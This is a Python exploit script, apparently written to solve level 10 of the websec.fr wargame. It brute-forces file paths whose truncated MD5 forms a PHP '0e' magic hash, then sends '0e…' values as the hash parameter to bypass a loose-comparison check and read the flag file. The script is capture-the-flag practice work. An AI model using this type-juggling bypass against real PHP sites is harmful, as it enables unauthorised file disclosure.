#!/usr/bin/env python3
import requests
import sys
import hashlib

url = "https://websec.fr/level10/index.php"

print("Búsqueda sistemática de collision", flush=True)
print("="*60, flush=True)

# Estrategia: buscar localmente paths que generen hash 0e con flags cortos
# luego probarlos online

tested_local = 0
tested_online = 0

import string
chars = string.ascii_lowercase + string.digits

print("\nGenerando y probando paths...\n", flush=True)

for c1 in chars:
    for c2 in chars:
        path = c1 + c2 + "flag.php"
        
        # Probar localmente con flags cortos
        for test_flag in ["", "a", "x", "W", "WE", "WEB"]:
            test_str = test_flag + path + test_flag
            h = hashlib.md5(test_str.encode()).hexdigest()[:8]
            
            tested_local += 1
            
            # Si genera hash 0e localmente, probarlo online
            if h[:2] == "0e" and h[2:].isdigit():
                print(f"Local 0e: path={path}, test_flag='{test_flag}', hash={h}", flush=True)
                print(f"  Probando online con múltiples hashes 0e...", flush=True)
                
                # Probar con varios hashes 0e
                for i in range(100):
                    hash_to_send = f"0e{i:06d}"
                    
                    try:
                        r = requests.get(url, params={"f": path, "hash": hash_to_send}, timeout=3)
                        tested_online += 1
                        
                        if "WEBSEC{" in r.text:
                            flag_start = r.text.find("WEBSEC{")
                            flag_end = r.text.find("}", flag_start)
                            flag = r.text[flag_start:flag_end+1]
                            
                            print(f"\n{'='*60}", flush=True)
                            print(f"¡¡¡FLAG!!!!", flush=True)
                            print(f"{'='*60}", flush=True)
                            print(f"FLAG: {flag}", flush=True)
                            print(f"Path: {path}", flush=True)
                            print(f"Hash enviado: {hash_to_send}", flush=True)
                            
                            with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                                f.write(f"FLAG: {flag}\nPath: {path}\nHash: {hash_to_send}\n")
                            
                            sys.exit(0)
                    
                    except Exception as e:
                        continue
        
        if tested_local % 1000 == 0:
            print(f"Stats: Local={tested_local}, Online={tested_online}", flush=True)

print(f"\nFinal: Local={tested_local}, Online={tested_online}", flush=True)